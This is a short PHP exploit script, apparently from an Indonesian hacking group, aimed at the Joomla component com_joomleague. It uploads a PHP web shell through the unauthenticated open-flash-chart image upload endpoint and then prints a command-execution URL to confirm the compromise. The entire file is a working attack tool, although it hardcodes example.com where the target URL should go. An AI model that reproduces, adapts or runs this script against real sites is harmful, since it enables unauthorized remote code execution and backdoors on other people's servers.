<?php

# com_joomleague ~ Exploit
# http://indonesiancoder.com/
#

echo <<<EOT

EOT;


$options = getopt('u:f:');

if(!isset($options['u'], $options['f']))
die("\n        Usage example: php IDC.php -u http://target.com/ -f 
IDC.php\n
-u http://target.com/    The full path to Joomla!
-f IDC.php             The name of the file to create.\n");

$url     =  $options['u'];
$file    =  $options['f'];


$shell = 
"http://www.example.com//components/com_joomleague/assets/classes//tmp-upload-images/{$file}";
$url   = 
"http://www.example.com//components/com_joomleague/assets/classes/open-flash-chart/ofc_upload_image.php?name={$file}";

$data      = "<?php eval(\$_GET['cmd']); ?>";
$headers = array('User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64;
rv:15.0) Gecko/20100101 Firefox/15.0.1',
'Content-Type: text/plain');


echo "        [+] Submitting request to: {$options['u']}\n";


$handle = curl_init();

curl_setopt($handle, CURLOPT_URL, $url);
curl_setopt($handle, CURLOPT_HTTPHEADER, $headers);
curl_setopt($handle, CURLOPT_POSTFIELDS, $data);
curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);

$source = curl_exec($handle);
curl_close($handle);


if(!strpos($source, 'Undefined variable: HTTP_RAW_POST_DATA') &&
@fopen($shell, 'r'))
{
echo "        [+] Exploit completed successfully!\n";
echo "        ______________________________________________\n\n
 {$shell}?cmd=system('id');\n";
}
else
{
die("        [+] Exploit was unsuccessful.\n");
}

?>
